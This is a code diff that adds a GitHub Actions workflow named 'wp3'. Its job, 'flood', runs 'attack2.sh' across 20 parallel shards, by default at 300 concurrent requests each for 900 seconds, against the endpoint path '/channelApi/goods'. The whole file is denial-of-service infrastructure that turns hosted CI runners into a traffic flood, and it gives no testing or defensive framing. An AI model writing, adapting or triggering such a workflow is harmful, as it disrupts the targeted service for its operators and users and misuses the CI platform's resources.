@@ -1,0 +1,29 @@
+name: wp3
+on:
+  workflow_dispatch:
+    inputs:
+      conc:
+        description: 'per-job parallel'
+        default: '300'
+      dur:
+        description: 'seconds'
+        default: '900'
+      path:
+        description: 'path'
+        default: '/channelApi/goods'
+
+jobs:
+  flood:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    strategy:
+      fail-fast: false
+      max-parallel: 20
+      matrix:
+        shard: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
+    steps:
+      - uses: actions/checkout@v4
+      - name: flood
+        run: |
+          chmod +x attack2.sh
+          bash attack2.sh "${{ github.event.inputs.conc }}" "${{ github.event.inputs.dur }}" "${{ github.event.inputs.path }}"
